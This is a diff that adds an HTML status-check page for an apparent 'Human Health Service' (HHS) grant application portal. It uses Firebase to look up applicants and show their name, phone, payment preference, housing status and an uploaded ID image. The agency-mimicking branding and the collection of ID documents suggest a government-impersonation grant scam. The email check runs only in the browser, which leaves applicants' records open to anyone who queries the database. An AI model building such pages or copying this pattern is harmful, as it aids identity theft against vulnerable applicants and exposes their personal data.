@@ -1,0 +1,156 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>HHS — Check Application Status</title>
+  <meta name="description" content="Check the status of your HHS Grant Application using your reference and email." />
+  <link rel="icon" href="logo.png" type="image/png" />
+  <style>
+    :root { --bg:#ffffff; --surface:#f8fafc; --panel:#ffffff; --border:#e5e7eb; --text:#0f172a; --muted:#475569; --primary:#1d4ed8; --primary-2:#2563eb; --success:#059669; --danger:#dc2626; --shadow:0 10px 30px rgba(2,6,23,0.08); }
+    html, body { margin:0; padding:0; font-family: Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; color:var(--text); background:var(--bg); }
+    .container { max-width: 800px; margin: 0 auto; padding: 0 20px; }
+    header.site-header { position: sticky; top:0; z-index:40; background: rgba(255,255,255,0.95); backdrop-filter: blur(8px); border-bottom:1px solid var(--border); }
+    .nav { display:flex; align-items:center; justify-content:space-between; gap:16px; padding: 14px 0; }
+    .brand { display:flex; align-items:center; gap:12px; text-decoration:none; color:inherit; }
+    .brand img { width:40px; height:40px; object-fit:contain; }
+    .brand .name { font-weight: 800; }
+    .brand .sub { color: var(--muted); font-size: 0.9rem; }
+
+    .panel { background:var(--panel); border:1px solid var(--border); border-radius:16px; box-shadow:var(--shadow); padding: 16px; margin: 18px 0; }
+    label { display:block; font-weight:700; margin: 6px 0; }
+    input[type="text"], input[type="email"] { width:100%; background:#fff; border:1px solid var(--border); border-radius:10px; padding:12px; }
+    input:focus { border-color: var(--primary-2); box-shadow: 0 0 0 3px rgba(37,99,235,0.15); outline: none; }
+    .btn { display:inline-flex; align-items:center; gap:8px; border:0; border-radius:10px; padding:12px 16px; font-weight:700; cursor:pointer; }
+    .btn.primary { background: linear-gradient(180deg,var(--primary),var(--primary-2)); color:#fff; box-shadow:var(--shadow); }
+    .btn.ghost { background:#fff; color:var(--primary-2); border:1px solid var(--border); }
+    .help { color: var(--muted); }
+    .error { color:#7f1d1d; background:#fee2e2; border:1px solid #fecaca; padding:10px; border-radius:10px; }
+    .status-badge { display:inline-flex; align-items:center; gap:8px; padding:6px 12px; border-radius:999px; font-weight:800; border:1px solid var(--border); }
+    .status-pending { color:#92400e; background:#fffbeb; border-color:#fcd34d; }
+    .status-approved { color:#065f46; background:#ecfdf5; border-color:#6ee7b7; }
+    .status-rejected { color:#991b1b; background:#fee2e2; border-color:#fecaca; }
+    .kv { display:grid; grid-template-columns: 160px 1fr; gap:8px; margin: 8px 0; }
+    .kv .k { color: var(--muted); }
+    .img-wrap { background: #f8fafc; border:1px solid var(--border); border-radius: 12px; padding: 8px; display:grid; place-items:center; }
+    .img-wrap img { max-width: 100%; border-radius: 8px; }
+    @media (max-width: 680px) { .kv { grid-template-columns: 1fr; } }
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-firestore-compat.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="container nav">
+      <a href="index.html" class="brand">
+        <img src="logo.png" alt="HHS" />
+        <div>
+          <div class="name">Human Health Service</div>
+          <div class="sub">Check Application Status</div>
+        </div>
+      </a>
+      <div>
+        <a href="index.html" class="btn ghost">Back to portal</a>
+      </div>
+    </div>
+  </header>
+
+  <main class="container" style="padding: 18px 0 28px;">
+    <section class="panel">
+      <h2 style="margin:0 0 6px 0;">Find your application</h2>
+      <p class="help">Enter your reference and the email address you used when applying.</p>
+      <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 10px;">
+        <div>
+          <label for="ref">Reference</label>
+          <input id="ref" type="text" placeholder="e.g., HHS-XXXXXXXX-XXXXX" />
+        </div>
+        <div>
+          <label for="email">Email</label>
+          <input id="email" type="email" placeholder="your@email.com" />
+        </div>
+      </div>
+      <div style="display:flex; gap:10px; margin-top:12px;">
+        <button id="btnSearch" class="btn primary">Check status</button>
+        <button id="btnClear" class="btn ghost">Clear</button>
+      </div>
+      <div id="err" class="error" style="display:none; margin-top:10px;"></div>
+    </section>
+
+    <section id="result" class="panel" style="display:none;">
+      <div style="display:flex; justify-content: space-between; align-items: center; gap: 8px; flex-wrap: wrap;">
+        <h3 style="margin:0;">Application</h3>
+        <div id="badge" class="status-badge status-pending">pending</div>
+      </div>
+      <div class="kv"><div class="k">Reference</div><div id="r-ref">-</div></div>
+      <div class="kv"><div class="k">Created</div><div id="r-created">-</div></div>
+      <div class="kv"><div class="k">Full name</div><div id="r-name">-</div></div>
+      <div class="kv"><div class="k">Email</div><div id="r-email">-</div></div>
+      <div class="kv"><div class="k">Phone</div><div id="r-phone">-</div></div>
+      <div class="kv"><div class="k">Payment</div><div id="r-payment">-</div></div>
+      <div class="kv"><div class="k">Housing</div><div id="r-housing">-</div></div>
+      <div class="img-wrap" style="margin-top:12px;">
+        <img id="r-img" alt="ID image" />
+      </div>
+    </section>
+  </main>
+
+  <script>
+    // Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdKDjmlXH8tFtF4rCvIzx11s4MgFSdFq0",
+      authDomain: "kfdn-8bdeb.firebaseapp.com",
+      projectId: "kfdn-8bdeb",
+      storageBucket: "kfdn-8bdeb.firebasestorage.app",
+      messagingSenderId: "122949220202",
+      appId: "1:122949220202:web:ba7b16a5d63599452f5713",
+      measurementId: "G-5BFYZ4DY0K"
+    };
+    const app = firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    function showErr(msg) { const el = document.getElementById('err'); el.textContent = msg; el.style.display = 'block'; }
+    function clearErr() { const el = document.getElementById('err'); el.textContent = ''; el.style.display = 'none'; }
+
+    function setBadge(status) {
+      const b = document.getElementById('badge');
+      const s = (status || 'pending').toLowerCase();
+      b.textContent = s;
+      b.className = 'status-badge ' + (s === 'approved' ? 'status-approved' : s === 'rejected' ? 'status-rejected' : 'status-pending');
+    }
+
+    function fmtDate(ts) { try { return ts?.toDate ? ts.toDate().toLocaleString() : new Date(ts).toLocaleString(); } catch { return '-'; } }
+
+    async function search() {
+      clearErr();
+      const ref = document.getElementById('ref').value.trim();
+      const email = document.getElementById('email').value.trim().toLowerCase();
+      if (!ref || !email) { showErr('Please enter both reference and email.'); return; }
+      try {
+        const q = await db.collection('applications').where('reference','==', ref).limit(1).get();
+        if (q.empty) { showErr('No application found for that reference.'); return; }
+        const doc = q.docs[0];
+        const d = doc.data();
+        const a = d.applicant || {};
+        if ((a.email || '').toLowerCase() !== email) { showErr('Email does not match this reference.'); return; }
+        // Render
+        document.getElementById('result').style.display = 'block';
+        setBadge(d.status);
+        document.getElementById('r-ref').textContent = d.reference || doc.id;
+        document.getElementById('r-created').textContent = fmtDate(d.createdAt);
+        document.getElementById('r-name').textContent = a.fullName || '-';
+        document.getElementById('r-email').textContent = a.email || '-';
+        document.getElementById('r-phone').textContent = a.phone || '-';
+        document.getElementById('r-payment').textContent = a.paymentPreference || '-';
+        document.getElementById('r-housing').textContent = a.housingStatus || '-';
+        const img = document.getElementById('r-img');
+        if (d.cloudinaryUrl) { img.src = d.cloudinaryUrl; img.alt = 'ID image'; } else { img.removeAttribute('src'); img.alt = 'No image'; }
+      } catch (e) {
+        showErr('Failed to look up application: ' + e.message);
+      }
+    }
+
+    document.getElementById('btnSearch').addEventListener('click', search);
+    document.getElementById('btnClear').addEventListener('click', () => { document.getElementById('ref').value=''; document.getElementById('email').value=''; document.getElementById('result').style.display='none'; clearErr(); });
+  </script>
+</body>
+</html>
